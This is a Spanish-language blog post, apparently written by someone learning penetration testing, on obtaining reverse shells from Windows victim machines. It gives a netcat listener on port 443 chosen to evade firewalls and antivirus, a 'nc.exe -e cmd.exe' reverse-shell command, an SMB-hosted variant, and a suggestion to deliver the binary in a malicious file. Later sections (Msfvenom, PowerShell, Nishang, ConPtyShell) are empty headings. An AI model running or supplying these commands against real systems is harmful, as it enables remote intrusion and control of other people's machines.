---
layout: single
title: Reverse Shells en Windows
excerpt: "En este artículo vamos a ver las formas que hay de mandarnos reverse shells cuando la maquina victima es Windows."
date: 2022-08-26
classes: wide
header:
  teaser: /assets/images/web-hacking/reverse-shell-windows/netcat.PNG
  teaser_home_page: true
  icon: 
categories:
  - Windows
tags:  
  - Windows
  - Reverse shell
---

He hecho este artículo ya que las `reverse shells` en `Windows` son diferentes a Linux y ya que he empezado a aprender Hacking para Windows, ya que en linux ya soy capaz de resolver maquinas sin ayuda pues se me ha ocurrido hacer este post.

# PONERNOS A LA ESCUCHA: 

Lo primero, antes de mandarnos una consola desde la máquina víctima necesitamos un `puerto` donde estemos `a la escucha` para que nos llegue ahí la shell.

Para esto solemos utilizar el puerto `443/tcp`, ya que es un puerto por el cual se transmiten datos en casos de páginas web, ya que es el puerto por el cual suelen correr los servicios `https`. Por lo tanto, los `firewalls y antivirus` `pueden detectar` datos transmitirse por ese puerto, pero `no le dan importancia`, ya que es normal que se manden datos por ahí. Y, por lo tanto, `somos menos detectables`.

Para esto utilizaremos el siguiente `comando` estando en `root`:

```
> nc -nlvp 443
listening on [any] 443 ...
```

## FORMA MEJORADA

Por lo que he estado viendo hay un comando que funciona mejor ya que nos permite utilizar atajos de teclado como `Ctl+L`:

```
> rlwrap nc -nlvp 443
listening on [any] 443 ...
```

![](/assets/images/web-hacking/reverse-shell-windows/)

# MANDARNOS UNA REVERSE SHELL
## Nc.exe

Este binario es `similar a netcat` en `Linux`, pero este funciona en `Windows`, tanto en 32, como en 64 bits.

Para esto usaremos el siguiente comando:

```
> nc.exe -e cmd.exe <nuestra ip> 443
```

En caso de que no este instalado lo podemos descargar desde: `https://github.com/int0x33/nc.exe/`

Con eso podemos mandarlo en un archivo malicioso y que lo ejecute o que el archivo lo descargue...

Pero también podemos montarnos un servidor SMB y utilizarlo desde ahí poniendo el siguiente comando en la máquina Windows:

```
> \\192.168.118.10\pwned\nc.exe -e cmd.exe <ip> <puerto>
```

## Msfvenom

## Powershell Reverse Shell One-Liner

## Nishang

## ConPtyShell
